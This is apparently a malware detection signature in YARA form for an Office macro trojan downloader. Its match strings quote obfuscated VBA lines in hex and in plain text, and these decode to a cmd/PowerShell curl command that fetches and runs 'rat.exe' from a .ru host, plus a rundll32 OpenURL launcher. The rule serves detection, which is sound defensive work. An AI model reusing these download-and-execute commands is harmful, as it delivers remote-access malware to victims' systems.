
rule TrojanDownloader_O97M_EncDoc_SZS_MTB{
	meta:
		description = "TrojanDownloader:O97M/EncDoc.SZS!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,03 00 03 00 03 00 00 01 00 "
		
	strings :
		$a_01_0 = {52 65 70 6c 61 63 65 28 22 63 6d 64 20 2f 63 20 70 6f 77 5e 71 75 69 63 6b 6c 79 73 65 78 75 61 6c 72 73 5e 68 71 75 69 63 6b 6c 79 73 65 78 75 61 6c 6c 6c 2f 57 20 30 31 20 63 5e 75 5e 72 6c 20 68 74 74 5e 70 73 3a 2f 2f 39 31 35 31 31 31 2e 72 75 2f 77 70 2d 69 6e 63 6c 75 64 71 75 69 63 6b 6c 79 73 65 78 75 61 6c 73 2f 72 61 74 2e 71 75 69 63 6b 6c 79 73 65 78 75 61 6c 5e 78 71 75 69 63 6b 6c 79 73 65 78 75 61 6c 20 2d 6f 20 22 20 26 20 63 61 72 72 79 74 68 75 73 20 26 20 22 3b 22 20 26 20 63 61 72 72 79 74 68 75 73 2c 20 22 71 75 69 63 6b 6c 79 73 65 78 75 61 6c 22 2c 20 22 65 22 29 } //01 00  Replace("cmd /c pow^quicklysexualrs^hquicklysexualll/W 01 c^u^rl htt^ps://915111.ru/wp-includquicklysexuals/rat.quicklysexual^xquicklysexual -o " & carrythus & ";" & carrythus, "quicklysexual", "e")
		$a_01_1 = {26 20 22 6c 69 63 5c 78 63 7a 75 79 2e 65 78 65 22 } //01 00  & "lic\xczuy.exe"
		$a_01_2 = {52 65 70 6c 61 63 65 28 22 72 75 6e 64 66 61 74 68 61 33 31 76 66 61 74 68 61 33 31 76 33 32 20 75 72 66 61 74 68 61 33 31 76 2e 64 66 61 74 68 61 33 31 76 66 61 74 68 61 33 31 76 2c 4f 70 65 6e 55 52 4c 20 22 20 26 20 6c 65 76 65 6c 65 6e 64 2c 20 22 66 61 74 68 61 33 31 76 22 2c 20 22 6c 22 29 } //00 00  Replace("rundfatha31vfatha31v32 urfatha31v.dfatha31vfatha31v,OpenURL " & levelend, "fatha31v", "l")
	condition:
		any of ($a_*)
 
}